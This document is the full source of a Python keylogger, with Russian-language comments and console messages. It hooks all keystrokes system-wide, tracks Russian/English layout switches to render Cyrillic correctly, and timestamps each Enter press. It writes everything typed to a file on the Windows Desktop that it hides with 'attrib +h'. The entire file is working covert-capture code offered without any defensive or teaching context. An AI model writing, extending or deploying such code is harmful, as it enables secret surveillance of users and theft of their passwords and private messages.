import keyboard, datetime, codecs, os, colorama
from colorama import Fore
vrem = datetime.datetime.now().strftime('%H:%M:%S')
print(Fore.GREEN + 'Программа запущена в '+ vrem)
user_name = os.environ['USERNAME']
print('Имя пользователя определено: '+ user_name)
if os.path.exists("C:\\Users\\"+ user_name +"\\Desktop\\keyboard_.txt"):
    os.unlink("C:\\Users\\"+ user_name +"\\Desktop\\keyboard_.txt")
file_name1 = codecs.open("C:\\Users\\"+ user_name +"\\Desktop\\keyboard_.txt", 'w', encoding='utf-8')
file_name1.close()
file_name = open("C:\\Users\\"+ user_name +"\\Desktop\\keyboard_.txt", 'w', encoding='utf-8')

print('Запись началась в '+vrem,file=file_name)

print('Создан файл для записи: keyboard_.txt на рабочем столе')
skrit = "attrib +h C:\\Users\\"+user_name+"\\Desktop\\keyboard_.txt"
os.system(skrit)
print('Файл скрыт')
file_name.flush()
print('Запись в файл keyboard_.txt началась')
print(Fore.WHITE)
p = set()
lang = 1
def print_pressed_keys(e):
    little=['ф','и','с','в','у','а','п','р','ш','о','л','д','ь','т','щ','з','й','к','ы','е','г','м','ц','ч','н','я']
    big=['Ф','И','С','В','У','А','П','Р','Ш','О','Л','Д','Ь','Т','Щ','З','Й','К','Ы','Е','Г','М','Ц','Ч','Н','Я']
    global lang
    global file_name
    a = str(e.name)
    b = str(e.event_type)
    now = datetime.datetime.now()
    if a=="right ctrl" and b=='down':
        if "right shift" in p:
            if lang % 2 != 0:
                print(" (Russian lang) ",end ="" ,file = file_name)
            if lang % 2 ==0:
                print(' (English lang) ',end ="" ,file = file_name)
            lang += 1
        p.add(a)
    if a == "right shift" and b == 'down':
        if "right ctrl" in p:
            if lang % 2 != 0:
                print(" (Russian lang) ",end ="" ,file = file_name)
            if lang % 2 == 0:
                print(' (English lang) ',end ="" ,file = file_name)
            lang += 1
        p.add(a)
    if a == "right ctrl" and b == 'up':
        p.discard(a)
    if a == "right shift" and b == 'up':
        p.discard(a)
    if a =="right shift" and b=='down':
        if "right alt" in p:
            if lang % 2 != 0:
                print(" (Russian lang) ",end ="" ,file = file_name)
            if lang % 2 == 0:
                print(' (English lang) ',end ="" ,file = file_name)
            lang += 1
        p.add(a)
    if a == "right alt" and b == 'down':
        if "right shift" in p:
            if lang % 2 != 0:
                print(" (Russian lang) ",end ="" ,file = file_name)
            if lang % 2 == 0:
                print(' (English lang) ',end ="" ,file = file_name)
            lang += 1
        p.add(a)
    if a == "right alt" and b == 'up':
        p.discard(a)
    if a == "right shift" and b == 'up':
        p.discard(a)
    if a=="ctrl" and b=='down':
        if "shift" in p:
            if lang % 2 != 0:
                print(" (Russian lang) ",end ="" ,file = file_name)
            if lang % 2 ==0:
                print(' (English lang) ',end ="" ,file = file_name)
            lang += 1
        p.add(a)
    if a == "shift" and b == 'down':
        if "ctrl" in p:
            if lang % 2 != 0:
                print(" (Russian lang) ",end ="" ,file = file_name)
            if lang % 2 == 0:
                print(' (English lang) ',end ="" ,file = file_name)
            lang += 1
        p.add(a)
    if a == "ctrl" and b == 'up':
        p.discard(a)
    if a == "shift" and b == 'up':
        p.discard(a)
    if a =="shift" and b=='down':
        if "alt" in p:
            if lang % 2 != 0:
                print(" (Russian lang) ",end ="" ,file = file_name)
            if lang % 2 == 0:
                print(' (English lang) ',end ="" ,file = file_name)
            lang += 1
        p.add(a)
    if a == "alt" and b == 'down':
        if "shift" in p:
            if lang % 2 != 0:
                print(" (Russian lang) ",end ="" ,file = file_name)
            if lang % 2 == 0:
                print(' (English lang) ',end ="" ,file = file_name)
            lang += 1
        p.add(a)
    if a == "alt" and b == 'up':
        p.discard(a)
    if a == "shift" and b == 'up':
        p.discard(a)
    if ( a == 'left windows' or a == 'right windows' ) and b == 'down':
        p.add("win")
    if ( a == 'left windows' or a == 'right windows' ) and b == 'up':
        p.discard("win")
    if len(a) == 1 and b != 'up':  #если это буква или цифра записываем её
        if "win" in p:
            print('\nwin' + '+' + a ,file = file_name)
        else:
             f = ord(a)
             if  lang%2==0:
                 if a == '>':
                     print('Ю' ,end ="" ,file = file_name)
                     return
                 if a== '?':
                     print(',' ,end ="" ,file = file_name)
                     return
                 if a == '<':
                     print('Б' ,end ="" ,file = file_name)
                     return
                 if a == '"':
                     print('Э' ,end ="" ,file = file_name)
                     return
                 if a == ':':
                     print('Ж' ,end ="" ,file = file_name)
                     return
                 if a == '}':
                     print('Ъ' ,end ="" ,file = file_name)
                     return
                 if  a == '{':
                     print('Х' ,end ="" ,file = file_name)
                     return
                 if a == '|':
                     print('/' ,end ="" ,file = file_name)
                     return
                 if a == '~':
                     print('Ё' ,end ="" ,file = file_name)
                     return
                 if a == ',':
                     print('б', end ='' ,file = file_name)
                     return
                 if a == '`':
                     print('ё', end ='' ,file = file_name)
                     return
                 if a == '@':
                     print('"', end ='' ,file = file_name)
                     return
                 if a == '#':
                     print('№', end ='' ,file = file_name)
                     return
                 if a == '$':
                     print(';', end ='' ,file = file_name)
                     return
                 if a == '^':
                     print(':', end ='' ,file = file_name)
                     return
                 if a == '&':
                     print('?', end ='' ,file = file_name)
                     return
                 if a == ".":
                     print('ю', end ='' ,file = file_name)
                     return
                 if a == '/':
                     print('.', end ='' ,file = file_name)
                     return
                 if a == '[':
                     print('х', end ='' ,file = file_name)
                     return
                 if a == ']':
                     print('ъ', end ='' ,file = file_name)
                     return
                 if a == "'":
                     print('э', end ='' ,file = file_name)
                     return
                 if a == ';':
                     print('ж', end ='' ,file = file_name)
                     return
                 if (f > 96 and f < 123):
                     print(little[f-97], end = "" ,file = file_name)

                 if (f>64 and f  < 91):
                     print(big[f-65], end = "" ,file = file_name)

                 if (f<65) or (f>90 and f <97) or (f>122):
                     print(a, end = '' ,file = file_name)
                 return
             if (lang % 2 != 0) or (f > 90 and f < 97) or f > 122 or f < 65 :
                 print(a, end='' ,file = file_name)
                 return
    if e.name ==  'enter' and b != 'down':      #если это enter переносим строку
        print('    Сейчас времени : ' +now.strftime('%H:%M:%S')+ '   ' ,file = file_name)
        file_name.flush()
    if a == 'space' and b != 'down':    #ели введён пробел, вводим пробел
        print(' ',end = '' ,file = file_name)
    if a == 'backspace' and b != 'down':
         print('~', end = '' ,file = file_name)
    if len(a) >1 and b != 'down' and a!= 'space' and a != 'enter' and a != 'backspace' and a != 'shift' and a != 'right shift' and a != 'right alt' and a != 'alt gr' and a != 'alt'   and a != 'right ctrl' and a != 'ctrl' and a != 'left windows' and a != 'right windows':
            if a == 'right' or a == 'left' or a == 'down' or a == 'up':
                if a == 'right':
                    print('(->)',end = '' ,file = file_name)
                if a == 'left':
                    print('(<-)', end = "" ,file = file_name)
                if a == 'down':
                    print('(W)', end = '' ,file = file_name)
                if a =='up':
                    print('(^)',end = '' ,file = file_name)
            else:
                print('\n'+a ,file = file_name)
    file_name.flush()
keyboard.hook(print_pressed_keys)
keyboard.wait()
file_name.close()




